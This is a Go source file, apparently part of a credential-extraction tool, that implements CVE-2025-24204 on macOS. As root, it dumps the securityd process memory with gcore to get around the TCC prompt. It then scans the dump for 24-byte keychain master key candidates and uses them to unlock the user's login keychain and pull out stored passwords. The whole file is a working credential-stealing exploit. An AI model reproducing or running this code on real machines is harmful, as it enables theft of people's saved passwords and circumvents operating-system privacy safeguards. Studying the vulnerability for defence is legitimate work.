//go:build darwin && keychain_gcore

package masterkey

// CVE-2025-24204: gcore holds the com.apple.system-task-ports.read entitlement, so a root process can
// dump securityd memory without a TCC prompt; we scan the dump for the 24-byte keychain master key.
// PoC: https://github.com/FFRI/CVE-2025-24204/tree/main/decrypt-keychain

import (
	"debug/macho"
	"encoding/binary"
	"errors"
	"fmt"
	"os"
	"os/exec"
	"path/filepath"
	"strconv"
	"strings"
	"time"
	"unsafe"

	"golang.org/x/sys/unix"

	"github.com/moond4rk/keychainbreaker"
)

var (
	homeDir, _        = os.UserHomeDir()
	loginKeychainPath = homeDir + "/Library/Keychains/login.keychain-db"
)

func findProcessByName(name string, forceRoot bool) (int, error) {
	buf, err := unix.SysctlRaw("kern.proc.all")
	if err != nil {
		return 0, fmt.Errorf("sysctl kern.proc.all failed: %w", err)
	}

	kinfoSize := int(unsafe.Sizeof(unix.KinfoProc{}))
	if len(buf)%kinfoSize != 0 {
		return 0, fmt.Errorf("sysctl kern.proc.all returned invalid data length")
	}

	count := len(buf) / kinfoSize
	for i := 0; i < count; i++ {
		proc := (*unix.KinfoProc)(unsafe.Pointer(&buf[i*kinfoSize]))
		pname := byteSliceToString(proc.Proc.P_comm[:])
		if pname == name {
			if !forceRoot || proc.Eproc.Pcred.P_ruid == 0 {
				return int(proc.Proc.P_pid), nil
			}
		}
	}
	return 0, fmt.Errorf("securityd process not found")
}

type addressRange struct {
	start uint64
	end   uint64
}

// decryptKeychainRecords requires root.
func decryptKeychainRecords() ([]keychainbreaker.GenericPassword, error) {
	if os.Geteuid() != 0 {
		return nil, errors.New("requires root privileges")
	}

	pid, err := findProcessByName("securityd", true)
	if err != nil {
		return nil, fmt.Errorf("failed to find securityd pid: %w", err)
	}

	// gcore appends ".PID" to the -o prefix, e.g. prefix.123
	corePrefix := filepath.Join(os.TempDir(), fmt.Sprintf("securityd-core-%d", time.Now().UnixNano()))
	corePath := fmt.Sprintf("%s.%d", corePrefix, pid)
	defer os.Remove(corePath)

	cmd := exec.Command("gcore", "-d", "-s", "-v", "-o", corePrefix, strconv.Itoa(pid))
	if err := cmd.Run(); err != nil {
		return nil, fmt.Errorf("failed to dump securityd memory: %w", err)
	}

	regions, err := findMallocSmallRegions(pid)
	if err != nil {
		return nil, fmt.Errorf("failed to find malloc small regions: %w", err)
	}

	candidates, err := scanMasterKeyCandidates(corePath, regions)
	if err != nil {
		return nil, fmt.Errorf("scan master key candidates: %w", err)
	}
	if len(candidates) == 0 {
		return nil, fmt.Errorf("no master key candidates found in securityd memory")
	}

	keychainBuf, err := os.ReadFile(loginKeychainPath)
	if err != nil {
		return nil, fmt.Errorf("read keychain: %w", err)
	}

	for _, candidate := range candidates {
		kc, err := keychainbreaker.Open(keychainbreaker.WithBytes(keychainBuf))
		if err != nil {
			continue
		}
		if err := kc.Unlock(keychainbreaker.WithKey(candidate)); err != nil {
			continue
		}

		records, err := kc.GenericPasswords()
		if err != nil {
			continue
		}
		if len(records) > 0 {
			return records, nil
		}
	}

	return nil, fmt.Errorf("tried %d candidates, none unlocked keychain", len(candidates))
}

func scanMasterKeyCandidates(corePath string, regions []addressRange) ([]string, error) {
	cmf, err := macho.Open(corePath)
	if err != nil {
		return nil, fmt.Errorf("failed to open core dump: %w", err)
	}
	defer cmf.Close()

	var candidates []string
	seen := make(map[string]struct{})
	for _, region := range regions {
		data, vaddr, err := getMallocSmallRegionData(cmf, region)
		if err != nil {
			continue
		}
		for i := 0; i < len(data)-16; i += 8 {
			val := binary.LittleEndian.Uint64(data[i : i+8])
			if val != 0x18 {
				continue
			}
			ptr := binary.LittleEndian.Uint64(data[i+8 : i+16])
			if ptr < region.start || ptr > region.end {
				continue
			}
			offset := ptr - vaddr
			if offset+0x18 > uint64(len(data)) {
				continue
			}
			masterKey := make([]byte, 0x18)
			copy(masterKey, data[offset:offset+0x18])
			keyStr := fmt.Sprintf("%x", masterKey)
			if _, found := seen[keyStr]; !found {
				candidates = append(candidates, keyStr)
				seen[keyStr] = struct{}{}
			}
		}
	}
	return candidates, nil
}

func findMallocSmallRegions(pid int) ([]addressRange, error) {
	cmd := exec.Command("vmmap", "--wide", strconv.Itoa(pid))
	output, err := cmd.Output()
	if err != nil {
		return nil, err
	}

	var regions []addressRange
	lines := strings.Split(string(output), "\n")
	for _, line := range lines {
		line = strings.TrimSpace(line)
		if strings.HasPrefix(line, "MALLOC_SMALL") {
			parts := strings.Fields(line)
			if len(parts) < 2 {
				continue
			}
			rangeParts := strings.Split(parts[1], "-")
			if len(rangeParts) != 2 {
				continue
			}
			start, err := strconv.ParseUint(strings.TrimPrefix(rangeParts[0], "0x"), 16, 64)
			if err != nil {
				continue
			}
			end, err := strconv.ParseUint(strings.TrimPrefix(rangeParts[1], "0x"), 16, 64)
			if err != nil {
				continue
			}
			regions = append(regions, addressRange{start: start, end: end})
		}
	}
	return regions, nil
}

func getMallocSmallRegionData(f *macho.File, region addressRange) ([]byte, uint64, error) {
	for _, seg := range f.Loads {
		if s, ok := seg.(*macho.Segment); ok {
			if s.Addr == region.start && s.Addr+s.Memsz == region.end {
				data := make([]byte, s.Filesz)
				_, err := s.ReadAt(data, 0)
				if err != nil {
					return nil, 0, err
				}
				return data, s.Addr, nil
			}
		}
	}
	return nil, 0, fmt.Errorf("region not found in core dump")
}

func byteSliceToString(s []byte) string {
	for i, v := range s {
		if v == 0 {
			return string(s[:i])
		}
	}
	return string(s)
}
